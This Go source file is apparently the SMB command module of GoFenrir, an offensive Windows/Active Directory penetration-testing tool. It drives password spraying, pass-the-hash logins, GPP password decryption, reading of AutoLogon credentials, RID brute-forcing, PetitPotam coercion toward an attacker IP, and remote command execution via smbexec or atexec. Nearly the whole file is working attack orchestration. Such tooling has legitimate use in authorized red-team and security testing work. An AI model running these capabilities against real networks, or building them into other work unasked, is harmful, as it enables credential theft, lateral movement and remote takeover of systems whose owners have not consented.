package root

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"

	"strings"

	"github.com/0xbbuddha/GoFenrir/core"
	smbcreds "github.com/0xbbuddha/GoFenrir/modules/smb/credentials"
	smbcoerce "github.com/0xbbuddha/GoFenrir/modules/smb/coerce"
	smbenum "github.com/0xbbuddha/GoFenrir/modules/smb/enumeration"
	smbexec "github.com/0xbbuddha/GoFenrir/modules/smb/exec"
	smbspider "github.com/0xbbuddha/GoFenrir/modules/smb/spider"
	"github.com/0xbbuddha/GoFenrir/protocols/smb"
	"github.com/spf13/cobra"
)

var (
	smbTarget      string
	smbUsername    string
	smbPassword    string
	smbHash        string
	smbDomain      string
	smbPort        int
	smbTimeout      int
	smbCheckShares  bool
	smbNullSession  bool
	smbGPPPasswords bool
	smbRIDBrute     bool
	smbRIDStart     uint32
	smbRIDEnd       uint32
	smbLocalGroups  bool
	smbSessions     bool
	smbLoggedOn     bool
	smbWhoHasPriv      string
	smbServerInfo      bool
	smbEnumServices    bool
	smbServicesFilter  string
	smbCheckAutoLogon  bool
	smbEnumRPC         bool
	smbCoerceTo        string
	smbLSASettings     bool
	smbExec            string
	smbExecMethod      string
	smbNoOutput        bool
	smbSpider          string
	smbSpiderFilter    string
	smbSpiderDepth     int
	smbPasswordSpray   bool
	smbNoBanner        bool
	smbOneline         bool
)

// flag renders a security fact: the insecure state in red, the safe state in green.
func flag(insecure bool, insecureLabel, secureLabel string) string {
	if insecure {
		return fmt.Sprintf("%s%s%s", core.ColorRed, insecureLabel, core.ColorReset)
	}
	return fmt.Sprintf("%s%s%s", core.ColorGreen, secureLabel, core.ColorReset)
}

// smbBannerLine folds the host facts into a single compact line (used with
// --oneline), separated by a dim pipe for readability.
func smbBannerLine(hi smbenum.HostInfo) string {
	parts := make([]string, 0, 6)
	if hi.Name != "" {
		parts = append(parts, fmt.Sprintf("%s%s%s", core.ColorBlue, hi.Name, core.ColorReset))
	}
	if hi.OS != "" {
		parts = append(parts, hi.OS)
	}
	if hi.Dialect != "" {
		parts = append(parts, hi.Dialect)
	}
	parts = append(parts,
		"SMBv1:"+flag(hi.SMBv1Enabled, "enabled", "disabled"),
		"signing:"+flag(!hi.SigningRequired, "off", "on"),
		"null:"+flag(hi.NullSession, "allowed", "denied"),
	)
	sep := fmt.Sprintf("%s │ %s", core.ColorGray, core.ColorReset)
	return strings.Join(parts, sep)
}

// smbPortOpen does a single quick TCP connect so a host with nothing on the SMB
// port is skipped at once, instead of stacking a negotiate timeout per dialect.
func smbPortOpen(host string, port int) bool {
	timeout := smb.DialTimeout
	if timeout <= 0 {
		timeout = 5 * time.Second
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

var smbCmd = &cobra.Command{
	Use:   "smb",
	Short: "Interact with SMB (v1/v2/v3)",
	Run:   runSMB,
}

func runSMB(cmd *cobra.Command, args []string) {
	if smbTarget == "" {
		core.Failure("--target is required")
		os.Exit(1)
	}

	// Bound every dial so dead hosts in a range fail fast instead of hanging.
	smb.DialTimeout = time.Duration(smbTimeout) * time.Second

	targets, err := core.ParseTargets(smbTarget)
	if err != nil {
		core.Failure(err.Error())
		os.Exit(1)
	}

	if smbNullSession {
		jobs := make([]core.Job, len(targets))
		for i, t := range targets {
			jobs[i] = core.Job{Target: t}
		}
		core.RunConcurrent(jobs, Threads, func(job core.Job) {
			out := &core.OutputBuffer{}
			out.Section(fmt.Sprintf("Null Session - %s", job.Target), 1)
			nullOk := smbenum.CheckNullSession(job.Target, smbPort)
			ipcOk := smbenum.CheckAnonymousIPCAccess(job.Target, smbPort)
			if nullOk {
				out.TreeEntryColored("Null session allowed", core.ColorRed, false)
			} else {
				out.TreeEntryColored("Null session denied", core.ColorGreen, false)
			}
			if ipcOk {
				out.TreeEntryColored("Anonymous IPC$ access allowed", core.ColorRed, true)
			} else {
				out.TreeEntryColored("Anonymous IPC$ access denied", core.ColorGreen, true)
			}
			out.Flush()
		})
		return
	}

	creds, err := core.ParseCredentials(smbUsername, smbPassword, smbHash)
	if err != nil {
		core.Failure(err.Error())
		os.Exit(1)
	}

	jobs := make([]core.Job, 0, len(targets)*len(creds))
	for _, target := range targets {
		for _, cred := range creds {
			jobs = append(jobs, core.Job{Target: target, Cred: cred})
		}
	}

	// When sweeping more than one host, dead IPs are skipped silently; for a
	// single explicit target we still report that nothing is listening.
	quiet := len(targets) > 1

	if smbPasswordSpray {
		core.RunConcurrent(jobs, Threads, func(job core.Job) {
			out := &core.OutputBuffer{}
			if !smbPortOpen(job.Target, smbPort) {
				if !quiet {
					out.Failure(fmt.Sprintf("[SMB] %s - port %d closed/filtered", job.Target, smbPort))
					out.Flush()
				}
				return
			}
			_, err := smb.NewSession(job.Target, smbPort, smbDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash)
			if err != nil {
				out.TreeEntryColored(fmt.Sprintf("%-30s %s", job.Cred.Username, err.Error()), core.ColorRed, false)
			} else {
				cred := job.Cred.Username
				if job.Cred.Hash != "" {
					cred += " (hash: " + job.Cred.Hash + ")"
				} else {
					cred += " / " + job.Cred.Password
				}
				out.TreeEntryColored(fmt.Sprintf("%-30s VALID", cred), core.ColorGreen, false)
			}
			out.Flush()
		})
		return
	}

	core.RunConcurrent(jobs, Threads, func(job core.Job) {
		out := &core.OutputBuffer{}

		if !smbPortOpen(job.Target, smbPort) {
			if !quiet {
				out.Failure(fmt.Sprintf("[SMB] %s - port %d closed/filtered", job.Target, smbPort))
				out.Flush()
			}
			return
		}

		session, err := smb.NewSession(job.Target, smbPort, smbDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash)
		if err != nil {
			out.Failure(fmt.Sprintf("[SMB] %s %s\\%s - %s", job.Target, smbDomain, job.Cred.Username, err.Error()))
			out.Flush()
			return
		}

		authMsg := fmt.Sprintf("[SMB] %s %s\\%s%s%s", job.Target, smbDomain, core.ColorGreen, job.Cred.Username, core.ColorReset)
		if job.Cred.Hash != "" {
			authMsg += fmt.Sprintf(" (Pass-the-Hash: %s%s%s)", core.ColorYellow, job.Cred.Hash, core.ColorReset)
		}

		var hi smbenum.HostInfo
		if !smbNoBanner {
			hi = smbenum.GetHostInfo(session, job.Target, smbPort)
			if smbOneline {
				authMsg += "  " + smbBannerLine(hi)
			}
		}
		out.Success(authMsg)

		if !smbNoBanner && !smbOneline {
			out.Section(fmt.Sprintf("Host - %s", job.Target), 1)
			if hi.Name != "" {
				out.TreeDetail("Name", hi.Name, false)
			}
			if hi.OS != "" {
				out.TreeDetail("OS", hi.OS, false)
			}
			out.TreeDetail("Dialect", hi.Dialect, false)
			out.TreeDetail("SMBv1", flag(hi.SMBv1Enabled, "enabled", "disabled"), false)
			out.TreeDetail("Signing", flag(!hi.SigningRequired, "not required", "required"), false)
			out.TreeDetail("Null session", flag(hi.NullSession, "allowed", "denied"), true)
		}

		if smbServerInfo {
			info, err := smbenum.GetServerInfo(session)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Server Info: %s", err.Error()))
			} else {
				out.Section("Server Info", 1)
				label := info.Version
				if info.OSHint != "" {
					label = fmt.Sprintf("%s (%s)", info.Version, info.OSHint)
				}
				hasComment := info.Comment != ""
				out.TreeDetail("Name", info.Name, false)
				out.TreeDetail("OS", label, false)
				out.TreeDetail("Roles", smbenum.FormatServerType(info.Roles), !hasComment)
				if hasComment {
					out.TreeDetail("Comment", info.Comment, true)
				}
			}
		}

		if smbGPPPasswords {
			entries, err := smbcreds.FindGPPPasswords(job.Target, smbPort, smbDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] GPP Passwords: %s", err.Error()))
			} else if len(entries) == 0 {
				out.Section("GPP Passwords", 0)
				out.TreeEntry("No cpassword found in SYSVOL", true)
			} else {
				out.Section("GPP Passwords", len(entries))
				for i, e := range entries {
					last := i == len(entries)-1
					label := e.UserName
					if label == "" {
						label = e.RunAs
					}
					if label == "" {
						label = "(unknown)"
					}
					out.TreeEntryColored(label, core.ColorRed, last)
					if e.NewName != "" {
						out.TreeDetail("NewName", e.NewName, false)
					}
					out.TreeDetail("CPassword", e.CPassword, false)
					out.TreeDetail("Password", e.Password, false)
					out.TreeDetail("File", e.FilePath, true)
				}
			}
		}

		if smbRIDBrute {
			domains, err := smbenum.RIDBrute(session, smbRIDStart, smbRIDEnd)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] RID Brute: %s", err.Error()))
			} else {
				for _, dom := range domains {
					total := len(dom.Users) + len(dom.Groups) + len(dom.Aliases)
					out.Section(fmt.Sprintf("Domain: %s", dom.Name), total)
					all := make([]smbenum.SAMREntry, 0, total)
					all = append(all, dom.Users...)
					all = append(all, dom.Groups...)
					all = append(all, dom.Aliases...)
					for i, e := range all {
						last := i == len(all)-1
						label := fmt.Sprintf("[RID %-5d] %s (%s)", e.RID, e.Name, e.Type)
						var color string
						switch e.Type {
						case "user":
							color = core.ColorGreen
						case "computer":
							color = core.ColorYellow
						default:
							color = core.ColorBlue
						}
						out.TreeEntryColored(label, color, last)
					}
				}
			}
		}

		if smbLoggedOn {
			users, err := smbenum.LoggedOnUsers(session)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] LoggedOn: %s", err.Error()))
			} else {
				out.Section("Logged-on Users", len(users))
				for i, u := range users {
					last := i == len(users)-1
					label := u.Username
					if u.LogonDomain != "" {
						label = u.LogonDomain + "\\" + u.Username
					}
					out.TreeEntryColored(label, core.ColorYellow, last)
				}
			}
		}

		if smbSessions {
			sessions, err := smbenum.EnumSessions(session)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Sessions: %s", err.Error()))
			} else {
				out.Section("Active Sessions", len(sessions))
				for i, s := range sessions {
					last := i == len(sessions)-1
					label := fmt.Sprintf("%s -> %s", s.Client, s.Username)
					if s.Time > 0 {
						label += fmt.Sprintf(" (connected %s, idle %s)", fmtDuration(s.Time), fmtDuration(s.IdleTime))
					}
					out.TreeEntryColored(label, core.ColorYellow, last)
				}
			}
		}

		if smbWhoHasPriv != "" {
			privs, err := smbenum.WhoHasPriv(session, smbWhoHasPriv)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Who-Has-Priv: %s", err.Error()))
			} else if len(privs) == 0 {
				out.Section("Privileges", 0)
				out.TreeEntry("No accounts found holding the specified privilege(s)", true)
			} else {
				out.Section("Privileges", len(privs))
				for pi, pe := range privs {
					lastPriv := pi == len(privs)-1
					out.TreeEntryColored(pe.Privilege, core.ColorYellow, lastPriv && len(pe.Holders) == 0)
					for hi, h := range pe.Holders {
						lastHolder := hi == len(pe.Holders)-1
						label := h.Name
						if h.Name != h.SID {
							label = fmt.Sprintf("%s (%s)", h.Name, h.SID)
						}
						out.TreeDetail("holder", label, lastPriv && lastHolder)
					}
				}
			}
		}

		if smbLSASettings {
			lsa, err := smbenum.GetLSASettings(session)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] LSA Settings: %s", err.Error()))
			} else {
				out.Section("LSA Settings", 1)
				// WDigest clear-text password storage
				if lsa.WDigestEnabled != nil {
					if *lsa.WDigestEnabled == 1 {
						out.TreeEntryColored("WDigest: ENABLED (clear-text passwords in LSASS)", core.ColorRed, false)
					} else {
						out.TreeEntryColored("WDigest: disabled", core.ColorGreen, false)
					}
				} else {
					out.TreeEntryColored("WDigest: not configured (default disabled)", core.ColorGreen, false)
				}
				// LSA PPL protection
				if lsa.RunAsPPL != nil {
					if *lsa.RunAsPPL >= 1 {
						out.TreeEntryColored(fmt.Sprintf("RunAsPPL: %d (LSA protected process)", *lsa.RunAsPPL), core.ColorGreen, false)
					} else {
						out.TreeEntryColored("RunAsPPL: 0 (LSA not protected)", core.ColorRed, false)
					}
				}
				// LM compatibility
				if lsa.LmCompatLevel != nil {
					out.TreeDetail("LmCompatibilityLevel", smbenum.LmCompatLevelString(*lsa.LmCompatLevel), false)
				}
				// Null session restrictions
				if lsa.RestrictAnonymous != nil {
					out.TreeDetail("RestrictAnonymous", fmt.Sprintf("%d", *lsa.RestrictAnonymous), false)
				}
				if lsa.RestrictAnonymousSAM != nil {
					out.TreeDetail("RestrictAnonymousSAM", fmt.Sprintf("%d", *lsa.RestrictAnonymousSAM), false)
				}
				if lsa.NoLMHash != nil {
					out.TreeDetail("NoLMHash", fmt.Sprintf("%d", *lsa.NoLMHash), true)
				}
			}
		}

		if smbCheckAutoLogon {
			al, err := smbenum.GetAutoLogon(session)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] AutoLogon: %s", err.Error()))
			} else {
				out.Section("AutoLogon", 1)
				if al.Enabled {
					out.TreeEntryColored("AutoAdminLogon: ENABLED", core.ColorRed, false)
				} else {
					out.TreeEntryColored("AutoAdminLogon: disabled", core.ColorGreen, false)
				}
				hasUser := al.Username != ""
				hasPass := al.Password != ""
				hasDomain := al.Domain != ""
				last := !hasUser && !hasPass && !hasDomain
				if last {
					out.TreeEntry("No credentials stored", true)
				} else {
					if hasDomain {
						out.TreeDetail("Domain", al.Domain, false)
					}
					if hasUser {
						out.TreeDetail("Username", al.Username, !hasPass)
					}
					if hasPass {
						out.TreeDetail("Password", al.Password, true)
					}
				}
			}
		}

		if smbEnumRPC {
			endpoints, err := smbenum.EnumRPCEndpoints(session)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] RPC Endpoints: %s", err.Error()))
			} else {
				out.Section("RPC Endpoints", len(endpoints))
				for i, ep := range endpoints {
					last := i == len(endpoints)-1
					id := ep.UUID
					if ep.Name != "" {
						id = ep.Name
					}
					label := fmt.Sprintf("[v%-5s] %s via %s[%s]", ep.Version, id, ep.Transport, ep.Endpoint)
					if ep.Protocol != "" {
						label += fmt.Sprintf(" (%s)", ep.Protocol)
					} else if ep.Annotation != "" && ep.Annotation != ep.Name {
						label += fmt.Sprintf(" (%s)", ep.Annotation)
					}
					var color string
					if ep.Name != "" {
						color = core.ColorGreen
					} else {
						color = core.ColorYellow
					}
					out.TreeEntryColored(label, color, last)
				}
			}
		}

		if smbCoerceTo != "" {
			result, err := smbcoerce.PetitPotam(session, smbCoerceTo)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Coerce (PetitPotam): %s", err.Error()))
			} else {
				out.Section("Coerce (PetitPotam)", 1)
				if result.Triggered {
					pipeLabel := ""
					if result.Pipe != "" {
						pipeLabel = fmt.Sprintf(" via %s", result.Pipe)
					}
					out.TreeEntryColored(fmt.Sprintf("Coercion sent%s -> %s (%s)", pipeLabel, smbCoerceTo, result.Status), core.ColorRed, true)
				} else {
					out.TreeEntryColored(fmt.Sprintf("%s", result.Status), core.ColorGreen, true)
				}
			}
		}

		if smbEnumServices {
			svcs, err := smbenum.EnumServices(session, smbServicesFilter)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Services: %s", err.Error()))
			} else {
				out.Section("Services", len(svcs))
				for i, svc := range svcs {
					lastSvc := i == len(svcs)-1

					type kv struct{ k, v string }
					var details []kv
					if svc.DisplayName != "" && svc.DisplayName != svc.Name {
						details = append(details, kv{"Display", svc.DisplayName})
					}
					if svc.BinaryPath != "" {
						details = append(details, kv{"Path", svc.BinaryPath})
					}
					if svc.Account != "" {
						details = append(details, kv{"Account", svc.Account})
					}
					if svc.StartType != "" {
						details = append(details, kv{"Start", svc.StartType})
					}

					var color string
					switch svc.State {
					case "Running":
						color = core.ColorGreen
					case "Stopped":
						color = core.ColorRed
					default:
						color = core.ColorYellow
					}
					label := fmt.Sprintf("[%-12s] %s", svc.State, svc.Name)
					out.TreeEntryColored(label, color, lastSvc && len(details) == 0)
					for di, d := range details {
						out.TreeDetail(d.k, d.v, lastSvc && di == len(details)-1)
					}
				}
			}
		}

		if smbLocalGroups {
			groups, err := smbenum.LocalGroups(session)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Local Groups: %s", err.Error()))
			} else {
				for _, g := range groups {
					out.Section(fmt.Sprintf("Group: %s (RID %d)", g.Name, g.RID), len(g.Members))
					for i, m := range g.Members {
						last := i == len(g.Members)-1
						label := m.Name
						if m.Name == m.SID {
							label = m.SID
						} else {
							label = fmt.Sprintf("%s (%s)", m.Name, m.SID)
						}
						var color string
						switch m.Type {
						case "user":
							color = core.ColorGreen
						case "computer":
							color = core.ColorYellow
						default:
							color = core.ColorBlue
						}
						out.TreeEntryColored(label, color, last)
					}
				}
			}
		}

		if smbCheckShares {
			shares, fallback, err := smbenum.DiscoverShares(session)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Shares: %s", err.Error()))
			} else {
				title := "Shares"
				if fallback {
					title = "Shares (enumeration denied, probed common names)"
				}
				out.Section(title, len(shares))
				for i, sh := range shares {
					last := i == len(shares)-1
					label := fmt.Sprintf("[%-10s] %s", sh.TypeLabel, sh.Name)
					if sh.Comment != "" {
						label += fmt.Sprintf(" - %s", sh.Comment)
					}
					if sh.CanRead {
						out.TreeEntryColored(label, core.ColorGreen, last)
					} else {
						out.TreeEntryColored(label+" (denied)", core.ColorRed, last)
					}
				}
			}
		}

		if smbExec != "" {
			var output string
			var err error
			switch strings.ToLower(smbExecMethod) {
			case "atexec":
				output, err = smbexec.AtExec(session, smbExec)
			default:
				output, err = smbexec.Exec(session, smbExec)
			}
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Exec: %s", err.Error()))
			} else if !smbNoOutput {
				lines := strings.Split(strings.TrimRight(output, "\r\n"), "\n")
				out.Section(fmt.Sprintf("Exec: %s", smbExec), len(lines))
				for i, l := range lines {
					out.TreeEntryColored(strings.TrimRight(l, "\r"), core.ColorReset, i == len(lines)-1)
				}
			}
		}

		if smbSpider != "" {
			spiderOpts := smbspider.Options{
				Share:  smbSpider,
				Depth:  smbSpiderDepth,
				Filter: smbSpiderFilter,
			}
			files, err := smbspider.Spider(session, spiderOpts)
			if err != nil {
				out.Failure(fmt.Sprintf("[SMB] Spider: %s", err.Error()))
			} else {
				shareLabel := smbSpider
				if smbSpiderFilter != "" {
					shareLabel = fmt.Sprintf("%s (filter: %s)", smbSpider, smbSpiderFilter)
				}
				out.Section(fmt.Sprintf("Spider %s", shareLabel), len(files))
				for i, f := range files {
					last := i == len(files)-1
					label := fmt.Sprintf("[%s] %s", f.Share, f.Path)
					if f.Size > 0 {
						label += fmt.Sprintf(" (%s)", fmtSize(f.Size))
					}
					out.TreeEntryColored(label, core.ColorGreen, last)
				}
				if len(files) == 0 {
					out.TreeEntry("No matching files found", true)
				}
			}
		}

		out.Flush()
	})
}

func fmtSize(n uint64) string {
	switch {
	case n >= 1<<30:
		return fmt.Sprintf("%.1fGB", float64(n)/(1<<30))
	case n >= 1<<20:
		return fmt.Sprintf("%.1fMB", float64(n)/(1<<20))
	case n >= 1<<10:
		return fmt.Sprintf("%.1fKB", float64(n)/(1<<10))
	default:
		return fmt.Sprintf("%dB", n)
	}
}

func fmtDuration(secs uint32) string {
	if secs < 60 {
		return fmt.Sprintf("%ds", secs)
	}
	if secs < 3600 {
		return fmt.Sprintf("%dm%ds", secs/60, secs%60)
	}
	return fmt.Sprintf("%dh%dm", secs/3600, (secs%3600)/60)
}

func init() {
	smbCmd.Flags().StringVarP(&smbTarget, "target", "t", "", "Target IP, hostname, CIDR, or file path")
	smbCmd.Flags().StringVarP(&smbUsername, "username", "u", "", "Username or file of usernames")
	smbCmd.Flags().StringVarP(&smbPassword, "password", "p", "", "Password or file of passwords")
	smbCmd.Flags().StringVarP(&smbHash, "hash", "H", "", "NT hash (format: [LM:]NT)")
	smbCmd.Flags().StringVarP(&smbDomain, "domain", "d", "", "Domain")
	smbCmd.Flags().IntVar(&smbPort, "port", 445, "SMB port")
	smbCmd.Flags().IntVar(&smbTimeout, "connect-timeout", 5, "Per-attempt connect/negotiate timeout in seconds (0 = manticore default, <0 = no limit)")
	smbCmd.Flags().BoolVar(&smbNoBanner, "no-banner", false, "Skip the host banner (OS, dialect, SMBv1, signing, null session) shown on login")
	smbCmd.Flags().BoolVar(&smbOneline, "oneline", false, "Render the host banner on a single compact line instead of a tree")
	for _, f := range []string{"target", "username", "password", "hash", "domain", "port", "connect-timeout", "no-banner", "oneline"} {
		smbCmd.Flags().SetAnnotation(f, "group", []string{"Connection"})
	}

	smbCmd.Flags().BoolVar(&smbCheckShares, "shares", false, "Enumerate all shares via NetrShareEnum with access check (falls back to probing common names if denied)")
	smbCmd.Flags().BoolVar(&smbNullSession, "null-session", false, "Check for null/anonymous session")
	smbCmd.Flags().BoolVar(&smbGPPPasswords, "gpp-passwords", false, "Search SYSVOL for GPP cpasswords and decrypt them (MS14-025)")
	smbCmd.Flags().BoolVar(&smbRIDBrute, "rid-brute", false, "Enumerate users/groups via SAMR (RID cycling fallback if enumeration denied)")
	smbCmd.Flags().Uint32Var(&smbRIDStart, "rid-start", 500, "Starting RID for cycling fallback")
	smbCmd.Flags().Uint32Var(&smbRIDEnd, "rid-end", 4000, "Ending RID for cycling fallback")
	smbCmd.Flags().BoolVar(&smbLocalGroups, "local-groups", false, "Enumerate local groups and their members via SAMR+LSA")
	smbCmd.Flags().BoolVar(&smbLoggedOn, "loggedon-users", false, "Enumerate logged-on users via MS-WKST (NetrWkstaUserEnum)")
	smbCmd.Flags().BoolVar(&smbSessions, "sessions", false, "Enumerate active SMB sessions via srvsvc (useful on DCs to spot admin sessions)")
	smbCmd.Flags().StringVar(&smbWhoHasPriv, "who-has-priv", "", `List accounts holding a privilege (e.g. SeDebugPrivilege) or "all" for every non-empty privilege`)
	smbCmd.Flags().BoolVar(&smbServerInfo, "server-info", false, "Query server name, OS version and roles via srvsvc NetrServerGetInfo")
	smbCmd.Flags().BoolVar(&smbEnumServices, "services", false, "Enumerate services via MS-SCMR (svcctl) including binary path and run-as account")
	smbCmd.Flags().StringVar(&smbServicesFilter, "services-filter", "", `Filter services by state: "running" or "stopped" (default: all)`)
	smbCmd.Flags().BoolVar(&smbCheckAutoLogon, "check-autologon", false, "Read AutoLogon credentials from HKLM\\...\\Winlogon via MS-RRP (winreg)")
	smbCmd.Flags().BoolVar(&smbEnumRPC, "enum-rpc", false, "Enumerate registered RPC endpoints via the endpoint mapper (EPM, port 135 via IPC$)")
	smbCmd.Flags().StringVar(&smbCoerceTo, "coerce-to", "", "Trigger PetitPotam (MS-EFSR) coercion: target authenticates to <attacker_ip> (capture with Responder)")
	smbCmd.Flags().BoolVar(&smbLSASettings, "lsa-settings", false, "Read LSA security settings: WDigest, RunAsPPL, LmCompatibilityLevel, null session restrictions")
	smbCmd.Flags().StringVar(&smbExec, "exec", "", "Execute a command on the target (see --exec-method)")
	smbCmd.Flags().StringVar(&smbExecMethod, "exec-method", "smbexec", "Execution method: smbexec (MS-SCMR service) or atexec (MS-TSCH scheduled task)")
	smbCmd.Flags().BoolVar(&smbNoOutput, "no-output", false, "Suppress command output (use with --exec for fire-and-forget)")
	smbCmd.Flags().StringVar(&smbSpider, "spider", "", `Recursively list files on a share (e.g. SYSVOL) or "all" for every readable share`)
	smbCmd.Flags().StringVar(&smbSpiderFilter, "spider-filter", "", `Glob pattern to match filenames (e.g. "*.xml", "pass*", default: all files)`)
	smbCmd.Flags().IntVar(&smbSpiderDepth, "depth", 0, "Maximum spider recursion depth (0 = unlimited)")
	smbCmd.Flags().BoolVar(&smbPasswordSpray, "password-spray", false, "Test credentials only (no enumeration) - use with -u file and -p password")
	for _, f := range []string{"shares", "null-session", "gpp-passwords", "rid-brute", "rid-start", "rid-end", "local-groups", "sessions", "loggedon-users", "who-has-priv", "server-info", "services", "services-filter", "check-autologon", "enum-rpc", "coerce-to", "lsa-settings", "exec", "exec-method", "no-output", "spider", "spider-filter", "depth", "password-spray"} {
		smbCmd.Flags().SetAnnotation(f, "group", []string{"Enumeration"})
	}

	smbCmd.MarkFlagRequired("target")

	rootCmd.AddCommand(smbCmd)
}
